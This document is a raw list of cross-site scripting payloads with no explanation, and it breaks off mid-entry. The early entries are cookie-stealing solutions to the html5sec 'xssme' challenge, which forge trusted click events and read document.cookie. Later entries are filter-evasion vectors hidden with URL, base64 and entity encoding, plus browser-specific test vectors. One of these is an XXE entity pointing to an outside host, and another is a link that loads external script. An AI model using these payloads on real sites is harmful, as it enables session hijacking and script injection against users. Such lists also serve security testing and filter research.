<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>
<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>
<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>
<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>
<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>
<script>alert(document.head.innerHTML.substr(146,20));</script>
<script>alert(document.head.childNodes[3].text)</script>
<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>
<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>
<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>
<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>
<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script> 
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> # 
<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>
<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>
<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E
<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
<a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
<a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
<a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
<var onmouseover="prompt(1)">On Mouse Over</var>?
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
<svg><script ?>alert(1)
<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script ?
<img src ?itworksonchrome?\/onerror = alert(1)???
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?
<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
<iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
"><img src=x onerror=prompt(1);>
<div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'`-->]]>]</div><div id="5"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div><div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div><div id="7"><input onfocus=alert(7) autofocus>//["'`-->]]>]</div><div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div><div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">X</a>//["'`-->]]>]</div><div id="10"><video poster=javascript:alert(10)//></video>//["'`-->]]>]</div><div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'`-->]]>]</div><div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div><div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div><div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div><div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div><div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["'`-->]]>]</div><div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["'`-->]]>]</div><div id="18"><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>//["'`-->]]>]</div><div id="19"><meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾//["'`-->]]>]</div><div id="20"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//["'`-->]]>]</div><div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//["'`-->]]>]</div><div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div><div id="23"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//["'`-->]]>]</div><div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//["'`-->]]>]</div><div id="25"><script src="#">{alert(25)}</script>;1//["'`-->]]>]</div><div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["'`-->]]>]</div><div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div>
<div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//["'`-->]]>]</div>
<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["'`-->]]>]</div><div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["'`-->]]>]</div><div id="31"><frameset onload=alert(31)>//["'`-->]]>]</div><div id="32"><table background="javascript:alert(32)"></table>//["'`-->]]>]</div><div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(2)">XXX</a>//["'`-->]]>]</div><div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["'`-->]]>]</div><div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["'`-->]]>]</div><div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)">XXX</a>//["'`-->]]>]</div><div id="37"><!--<img src="--><img src=x onerror=alert(37)//">//["'`-->]]>]</div><div id="38"><comment><img src="</comment><img src=x onerror=alert(38)//">//["'`-->]]>]</div>
<div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->
<![><img src="]><img src=x onerror=alert(39)//">

<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>//["'`-->]]>]</div>
<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>
<div id="41"><li style=list-style:url() onerror=alert(41)></li>
<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//["'`-->]]>]</div>
<div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">XXX</a></body>//["'`-->]]>]</div>
<div id="43"><?xml version="1.0" standalone="no"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">
@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}
</style>
</head>
<body>Hello</body>
</html>//["'`-->]]>]</div>
<div id="44"><style>*[{}@import'test.css?]{color: green;}</style>X//["'`-->]]>]</div><div id="45"><div style="font-family:'foo[a];color:red;';">XXX</div>//["'`-->]]>]</div><div id="46"><div style="font-family:foo}color=red;">XXX</div>//["'`-->]]>]</div><div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["'`-->]]>]</div><div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["'`-->]]>]</div><div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["'`-->]]>]</div><div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["'`-->]]>]</div><div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["'`-->]]>]</div><div id="52"><x style="behavior:url(test.sct)">//["'`-->]]>]</div>
<div id="53"><xml id="xss" src="test.htc"></xml>
<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>
<div id="54"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//["'`-->]]>]</div><div id="55"><video><source onerror="alert(55)">//["'`-->]]>]</div><div id="56"><video onerror="alert(56)"><source></source></video>//["'`-->]]>]</div><div id="57"><b <script>alert(57)//</script>0</script></b>//["'`-->]]>]</div><div id="58"><b><script<b></b><alert(58)</script </b></b>//["'`-->]]>]</div><div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["'`-->]]>]</div><div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["'`-->]]>]</div>
<div id="61"><div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>//["'`-->]]>]</div>

<div id="62"><!-- IE 6-8 -->
<x '="foo"><x foo='><img src=x onerror=alert(62)//'>

<!-- IE 6-9 -->
<! '="foo"><x foo='><img src=x onerror=alert(2)//'>
<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>

<div id="63"><embed src="javascript:alert(63)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF
<img src="javascript:alert(2)">
<image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓
<script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓//["'`-->]]>]</div>
<div id="64"><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div><div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div>
<div id="66"><?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
<root/>//["'`-->]]>]</div>

<div id="67"><!DOCTYPE x [
    <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x"
